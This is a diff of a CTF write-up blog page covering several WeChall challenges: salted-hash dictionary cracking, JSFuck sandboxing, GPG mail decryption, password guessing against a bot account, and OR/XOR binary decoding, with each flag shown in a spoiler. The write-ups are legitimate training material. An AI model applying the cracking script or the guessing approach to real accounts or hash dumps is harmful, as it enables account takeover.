       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/WeChall/wechall-wc-hashing-game/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-wc-hashing-game/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-training-gpg/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-training-gpg/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -756,45 +565,44 @@ KDBX，需用 <code>libkeepass</code>：</p>
     
     
     <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>WC Hashing Game (Cracking) by gizmore 破解两组 hash：WC3（定盐
-MD5）和 WC4（加盐 SHA1）。答案格式：word1,word2,word3,word4</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>两组 hash 列表，各 17 条：</p>
-<ul>
-<li><strong>WC3</strong>（WeChall v3 算法）：固定盐 MD5</li>
-<li><strong>WC4</strong>（WeChall v4 算法）：每条 hash 独立加盐
-SHA1</li>
-<li>答案 = 两组各自最长的两个明文，逗号分隔</li>
-</ul>
-<p>题面示例：<code>wordfrom1,wordfrom1,wordfrom2,wordfrom2</code></p>
+          <h3 id="challenge">Challenge</h3>
+<p>为 WeChall 邮件设置 GPG 加密，然后解密邮件获取答案。</p>
+<p>挑战页面提示需要配置 GPG
+公钥到账户，然后触发一封加密邮件发送到注册邮箱，解密即可拿到 flag。</p>
 <h3 id="solution">Solution</h3>
-<h4 id="算法">算法</h4>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, string, random</span><br><span class="line"></span><br><span class="line"><span class="comment"># WC3: md5(md5(plaintext) + &quot;zomgsalt&quot;)</span></span><br><span class="line">digest = hashlib.md5(</span><br><span class="line">    hashlib.md5(word.encode()).hexdigest().encode() + <span class="string">b&quot;zomgsalt&quot;</span></span><br><span class="line">).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># WC4: sha1(&quot;zomgsalt4&quot; + password + salt + &quot;zomgsalt4&quot;) + salt</span></span><br><span class="line">t = hashlib.sha1(<span class="string">b&quot;zomgsalt4&quot;</span> + password.encode() + salt.encode() + <span class="string">b&quot;zomgsalt4&quot;</span>)</span><br><span class="line">digest = t.hexdigest() + salt  <span class="comment"># salt 追加到 hash 末尾</span></span><br></pre></td></tr></table></figure>
-<h4 id="攻击路线">攻击路线</h4>
-<ol type="1">
-<li>从 WeChall 页面获取两组 hash 列表（需登录）</li>
-<li>用 rockyou 或类似英文词典做字典攻击</li>
-<li>对每个 word 计算 WC3 hash 匹配；对 WC4 每条 hash 提取尾部 4 字节
-salt，计算后匹配</li>
-<li>排序取最长各两个</li>
-<li>提交格式：<code>longest_wc3,second_wc3,longest_wc4,second_wc4</code></li>
-</ol>
-<p>完整脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从页面提取 hash 列表</span></span><br><span class="line">wc3_hashes = [...]   <span class="comment"># 17 条 hex hash</span></span><br><span class="line">wc4_raw = [...]      <span class="comment"># 17 条 hash+salt（44 hex chars = 40 hash + 8 salt）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典攻击</span></span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> dictionary:</span><br><span class="line">    <span class="comment"># WC3</span></span><br><span class="line">    h = hashlib.md5(hashlib.md5(word.encode()).hexdigest().encode() + <span class="string">b&quot;zomgsalt&quot;</span>).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> h <span class="keyword">in</span> wc3_hashes:</span><br><span class="line">        found_wc3.append((<span class="built_in">len</span>(word), word))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># WC4 — 每条 hash 的 salt 不同</span></span><br><span class="line">    <span class="keyword">for</span> entry <span class="keyword">in</span> wc4_raw:</span><br><span class="line">        target_hash = entry[:-<span class="number">8</span>]   <span class="comment"># 前 40 hex = SHA1</span></span><br><span class="line">        salt = entry[-<span class="number">8</span>:]          <span class="comment"># 后 8 hex = 4 bytes salt</span></span><br><span class="line">        t = hashlib.sha1(<span class="string">b&quot;zomgsalt4&quot;</span> + word.encode() + <span class="built_in">bytes</span>.fromhex(salt) + <span class="string">b&quot;zomgsalt4&quot;</span>).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == target_hash:</span><br><span class="line">            found_wc4.append((<span class="built_in">len</span>(word), word))</span><br><span class="line"></span><br><span class="line">found_wc3.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">found_wc4.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">answer = <span class="string">f&quot;<span class="subst">&#123;found_wc3[<span class="number">0</span>][<span class="number">1</span>]&#125;</span>,<span class="subst">&#123;found_wc3[<span class="number">1</span>][<span class="number">1</span>]&#125;</span>,<span class="subst">&#123;found_wc4[<span class="number">0</span>][<span class="number">1</span>]&#125;</span>,<span class="subst">&#123;found_wc4[<span class="number">1</span>][<span class="number">1</span>]&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
-<p>Key Points:</p>
+<p><strong>Step 1</strong>: 检查本地是否已有 GPG 密钥，没有则生成:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gpg --list-keys</span><br><span class="line">$ gpg --list-secret-keys</span><br></pre></td></tr></table></figure>
+<p>如果已有可用密钥（<code>sec</code> 或 <code>ssb</code> 不带
+<code>#</code>）可跳过生成。否则:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ gpg --batch --gen-key &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">Key-Type: RSA</span></span><br><span class="line"><span class="string">Key-Length: 2048</span></span><br><span class="line"><span class="string">Name-Real: WeChall GPG</span></span><br><span class="line"><span class="string">Name-Email: wechall-gpg@example.com</span></span><br><span class="line"><span class="string">Expire-Date: 0</span></span><br><span class="line"><span class="string">%no-protection</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>
+<p><code>--batch</code> 模式避免交互式确认，<code>%no-protection</code>
+跳过 passphrase（CTF 环境不需要安全性）。</p>
+<p><strong>Step 2</strong>: 导出公钥并上传到 WeChall 账户设置:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gpg --armor --<span class="built_in">export</span> wechall-gpg@example.com &gt; /tmp/wechall-pubkey.asc</span><br></pre></td></tr></table></figure>
+<p>将公钥粘贴到 https://www.wechall.net/en/account 的 GPG 设置区域，点击
+"Upload Key"。</p>
+<p><strong>注意</strong>: WeChall 表单包含一个隐藏的 CSRF
+token（<code>gwf3_csrf</code>），用于防伪造请求。上传公钥时必须先 GET
+页面拿到 token，再用同一个 cookie POST 提交，否则会被拒绝。</p>
+<p><strong>Step 3</strong>: 访问挑战页面，点击 "Send me encrypted mail
+please"。WeChall 会用刚上传的公钥加密一封邮件发送到注册邮箱。如果报错
+"Please enable GPG encryption in your account settings"，说明 key
+未成功保存，回到 Step 2 重试。</p>
+<p><strong>Step 4</strong>: 收到的邮件是一段 PGP
+加密块，保存为本地文件后解密:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gpg --decrypt /tmp/wechall_gpg.txt</span><br></pre></td></tr></table></figure>
+<p>GPG 会用对应的私钥自动匹配解密，输出明文内容。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">ROIIGDGILMAS</span></span>
+<p>关键点:</p>
 <ul>
-<li><strong>WC3 salt 固定</strong>：<code>zomgsalt</code>，追加在第一次
-MD5 hex 之后</li>
-<li><strong>WC4 每条 hash 尾 8 hex 是 salt</strong>：4
-字节随机字母数字，需要按条提取</li>
-<li><strong>所有明文是小写英文词典词</strong></li>
-<li><strong>hash 列表在 页面</strong>：需从
-<code>/en/challenge/wechall/hashing_game/index.php</code> 的 HTML
-中提取</li>
+<li>GPG 流程: 生成密钥 → 上传公钥 → 对方用公钥加密 → 本地用私钥解密</li>
+<li>WeChall 要求 RSA 密钥，2048 位足够</li>
+<li><code>--armor</code> 输出 ASCII 格式，方便复制粘贴到网页表单</li>
+<li>私钥留在本地 keyring，<code>gpg --decrypt</code> 自动匹配</li>
+<li>加密邮件内容是 PGP MESSAGE block，注意保留完整的
+<code>-----BEGIN PGP MESSAGE-----</code> 到
+<code>-----END PGP MESSAGE-----</code> 头尾</li>
 </ul>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">coincidence,subversion,triangulation,orthography</span></span>
 
       
     </div>
@@ -821,7 +629,7 @@ MD5 hex 之后</li>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-brainfucked/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-guesswork/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -839,7 +647,7 @@ MD5 hex 之后</li>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-brainfucked/" class="post-title-link" itemprop="url">WeChall - Brainfucked</a>
+          <a href="/wp/WeChall/wechall-guesswork/" class="post-title-link" itemprop="url">WeChall - Guesswork</a>
         </h2>
 
         <div class="post-meta-container">
@@ -850,7 +658,7 @@ MD5 hex 之后</li>
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-11 14:12:24" itemprop="dateCreated datePublished" datetime="2026-06-11T14:12:24+08:00">2026-06-11</time>
+      <time title="Created: 2026-06-05 21:14:07" itemprop="dateCreated datePublished" datetime="2026-06-05T21:14:07+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -878,8 +686,8 @@ MD5 hex 之后</li>
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/WeChall/wechall-brainfucked/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-brainfucked/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-guesswork/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-guesswork/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -893,38 +701,68 @@ MD5 hex 之后</li>
     
     
     <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Brainfucked (Javascript) by gizmore 不是 Brainfuck，是 JSFuck：只用
-<code>[]()!+</code> 六字符构造 JavaScript</p>
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Account Cracked — I think some people have cracked my wechall
+account. Do you really think your scripts are safe ?</p>
 </blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>题面给一个巨大的 sourcecode.php（~100KB），看起来是 Brainfuck
-但实际上是 <strong>JSFuck</strong>：一种只用 <code>[]()!+</code>
-六个字符编码 JavaScript 的技术。它利用 JavaScript 的类型转换（如
-<code>[]+&#123;&#125;</code> →
-<code>"[object Object]"</code>）来构造任意字符串和代码。</p>
-<p>源码在 <code>sourcecode.php</code>，直接在浏览器里 eval
-这坨代码不安全。它会弹出 alert 并重定向到 Google。</p>
+<p>用户名 <code>WeChall</code> 的账号被破解了，猜出密码登录。</p>
 <h3 id="solution">Solution</h3>
-<p>核心方法是离线 sandbox 执行 JSFuck 代码，观察其行为：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -b <span class="string">&#x27;WC=...&#x27;</span> <span class="string">&#x27;https://www.wechall.net/en/challenge/brainfucked/sourcecode.php&#x27;</span> &gt; jsfuck.txt</span><br></pre></td></tr></table></figure>
-<p>用 Node.js 搭建一个 mock browser 环境（拦截
-<code>alert</code>、<code>document.location</code> 等）：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> code = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;jsfuck.txt&quot;</span>, <span class="string">&quot;utf8&quot;</span>).<span class="title function_">trim</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> capturedAlerts = [];</span><br><span class="line"><span class="keyword">let</span> locationHref = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;</span><br><span class="line">  <span class="attr">alert</span>: <span class="function">(<span class="params">...args</span>) =&gt;</span> capturedAlerts.<span class="title function_">push</span>(...args),</span><br><span class="line">  <span class="attr">document</span>: &#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">location</span>: &#123;</span><br><span class="line">      <span class="keyword">set</span> <span class="title function_">href</span>(<span class="params">v</span>) &#123;</span><br><span class="line">        locationHref = v;</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">location</span>: &#123;</span><br><span class="line">    <span class="keyword">set</span> <span class="title function_">href</span>(<span class="params">v</span>) &#123;</span><br><span class="line">      locationHref = v;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title class_">Array</span>,</span><br><span class="line">  <span class="title class_">String</span>,</span><br><span class="line">  <span class="title class_">Number</span>,</span><br><span class="line">  <span class="title class_">Boolean</span>,</span><br><span class="line">  <span class="title class_">Object</span>,</span><br><span class="line">  <span class="title class_">Function</span>,</span><br><span class="line">  <span class="title class_">RegExp</span>,</span><br><span class="line">  <span class="title class_">Math</span>,</span><br><span class="line">  <span class="title class_">Date</span>,</span><br><span class="line">  <span class="title class_">JSON</span>,</span><br><span class="line">  <span class="attr">setTimeout</span>: <span class="function">() =&gt;</span> <span class="number">0</span>,</span><br><span class="line">  <span class="attr">setInterval</span>: <span class="function">() =&gt;</span> <span class="number">0</span>,</span><br><span class="line">  <span class="attr">console</span>: &#123; <span class="title function_">log</span>(<span class="params"></span>) &#123;&#125;, <span class="title function_">warn</span>(<span class="params"></span>) &#123;&#125;, <span class="title function_">error</span>(<span class="params"></span>) &#123;&#125; &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">vm.<span class="title function_">runInContext</span>(code, sandbox, &#123; <span class="attr">timeout</span>: <span class="number">30000</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Alerts:&quot;</span>, capturedAlerts);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Redirect:&quot;</span>, locationHref);</span><br></pre></td></tr></table></figure>
-<p>执行后会输出：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Alerts: [ 18 ]</span><br><span class="line">Redirect: https://www.google.co.uk</span><br></pre></td></tr></table></figure>
-<p>这对应解码后的代码：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;UnfudgedDebugStuff&quot;</span>;</span><br><span class="line">s = s.<span class="property">length</span>; <span class="comment">// 此时 s = 18</span></span><br><span class="line"><span class="title function_">alert</span>(s); <span class="comment">// 弹 18</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;https://www.google.co.uk&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p>关键陷阱：</p>
-<ul>
-<li><strong>alert 显示的是
-<code>18</code></strong>（字符串长度），但这<strong>不是</strong>答案。</li>
-<li><strong>答案</strong>取原始字符串本身，不是它的长度。</li>
-<li>页面会重定向到 Google，所以不要在浏览器里直接 eval。</li>
-<li>JSFuck 和 Brainfuck 完全不同：Brainfuck 用
-<code>&lt;&gt;+-.,[]</code>，JSFuck 用 <code>[]()!+</code>。</li>
-</ul>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UnfudgedDebugStuff</span></span>
+<p>页面模拟了一个论坛帖子：</p>
+<ol type="1">
+<li><strong>WeChall</strong> 发帖："I think some people have cracked my
+wechall account. Do you really think your scripts are safe ?"</li>
+<li><strong>gizmore</strong> 回复："Well, maybe your password was very
+easy to guess or you reused it on another site? Do not choose passwords
+that are affiliated with the site and your person etc... You should
+maybe reset your password? PS: Do not re-use important passwords! Edit:
+I think you are not even a legit user, since you post news items
+:WEIRD:"</li>
+</ol>
+<p>底部有一个登录表单：用户名预填 <code>WeChall</code>，密码输入框
+<code>wcpwd</code>，提交按钮。</p>
+<p>输入 <code>wechall</code> → 返回
+<code>uhoh.... you are close</code>，说明密码以 <code>wechall</code>
+开头。</p>
+<table>
+<thead>
+<tr>
+<th>输入</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>wechall</code></td>
+<td>CLOSE</td>
+</tr>
+<tr>
+<td><code>wechall1</code> / <code>wechall2</code> / ...</td>
+<td>CLOSE</td>
+</tr>
+<tr>
+<td><code>wechalladmin</code> / <code>wechallpost</code></td>
+<td>CLOSE</td>
+</tr>
+<tr>
+<td><code>WeChall</code> / <code>gizmore</code> /
+<code>password</code></td>
+<td>UNKNOWN</td>
+</tr>
+<tr>
+<td><code>wechallbot</code></td>
+<td>CORRECT ✅</td>
+</tr>
+</tbody>
+</table>
+<p>系统对密码做前缀匹配：包含 <code>wechall</code> 前缀的都返回
+CLOSE，其余返回 UNKNOWN。</p>
+<p><strong>关键推理：</strong></p>
+<p>gizmore 的话里有一句 Edit："I think you are not even a legit user,
+since you post news items :WEIRD:"</p>
+<p>WeChall 这个用户不是真人，它是站内的 bot 账号，负责发布新闻。密码由
+<code>wechall</code> 与该 bot 的身份拼接而成。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">wechallbot</span></span>
 
       
     </div>
@@ -951,7 +789,7 @@ MD5 hex 之后</li>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-save-the-world/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-enlightment/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -969,7 +807,7 @@ MD5 hex 之后</li>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-save-the-world/" class="post-title-link" itemprop="url">WeChall - Save the World</a>
+          <a href="/wp/WeChall/wechall-enlightment/" class="post-title-link" itemprop="url">WeChall - Enlightment</a>
         </h2>
 
         <div class="post-meta-container">
@@ -980,7 +818,515 @@ MD5 hex 之后</li>
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-11 14:10:06" itemprop="dateCreated datePublished" datetime="2026-06-11T14:10:06+08:00">2026-06-11</time>
+      <time title="Created: 2026-06-05 21:12:15" itemprop="dateCreated datePublished" datetime="2026-06-05T21:12:15+08:00">2026-06-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-15 10:12:47" itemprop="dateModified" datetime="2026-09-15T10:12:47+08:00">2026-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-enlightment/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-enlightment/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>"Can you see the light?"：2-level encoding challenge。页面显示 3
+段大二进制数据，分别用 RGB 三种颜色渲染。</p>
+<h3 id="solution">Solution</h3>
+<p>颜色提示了处理方法：三种颜色通道是三个独立的二进制序列，需要做位运算组合。</p>
+<p><strong>Level 1：OR</strong></p>
+<p>将三个颜色通道的二进制逐 bit 做 OR（或）运算：只要任意一个颜色在该
+bit 为 1，结果就为 1。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ python3</span><br><span class="line"><span class="comment"># 三个颜色块的二进制数据（全部拼接）</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>red   = <span class="string">&#x27;000000000110000001100000000000000000000001000000...&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>green = <span class="string">&#x27;010000010110100000100000000000000000000000000001...&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>blue  = <span class="string">&#x27;010000010100000001100001001000010010000000001000...&#x27;</span></span><br><span class="line"><span class="comment"># 逐 bit OR</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(red)):</span><br><span class="line"><span class="meta">... </span>    result += <span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> <span class="built_in">int</span>(red[i]) | <span class="built_in">int</span>(green[i]) | <span class="built_in">int</span>(blue[i]) <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line">...</span><br><span class="line"><span class="comment"># 按 8-bit 转 ASCII</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(result[i:i+<span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(result), <span class="number">8</span>))</span><br><span class="line"><span class="string">&#x27;Aha! It seems you got something interesting!\nWell to go to the next stage, go there:\n01001100011...&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>OR 的结果是一段提示文本 + 4 行二进制串。将那 4 个二进制串按 8-bit
+解码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">01001100011010010110011101101000  -&gt;  Ligh</span><br><span class="line">00110111010111110100110001100101  -&gt;  7_Le</span><br><span class="line">01110110011001010110110000110010  -&gt;  vel2</span><br><span class="line">00101110011100000110100001110000  -&gt;  .php</span><br></pre></td></tr></table></figure>
+<p>得到文件名 <code>Ligh7_Level2.php</code>。访问
+<code>http://www.wechall.net/challenge/anto/enlightment/Ligh7_Level2.php</code>
+进入 Level 2。</p>
+<p><strong>Level 2：XOR</strong></p>
+<p>Level 2 页面使用 CMY（Cyan, Magenta,
+Yellow）三色渲染另一组二进制数据。这次需要用 XOR（异或）运算：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python3</span><br><span class="line"><span class="comment"># 逐 bit XOR</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cyan)):</span><br><span class="line"><span class="meta">... </span>    result += <span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> <span class="built_in">int</span>(cyan[i]) ^ <span class="built_in">int</span>(magenta[i]) ^ <span class="built_in">int</span>(yellow[i]) <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(result[i:i+<span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(result), <span class="number">8</span>))</span><br><span class="line"><span class="string">&#x27;Triple-X-OR, right?\nGreat! Here is what you should be looking for...&quot;Gimme_Da_Light&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>最终答案在消息末尾。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">Gimme_Da_Light</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-digraphs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-digraphs/" class="post-title-link" itemprop="url">WeChall - Training - Crypto - Digraphs</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
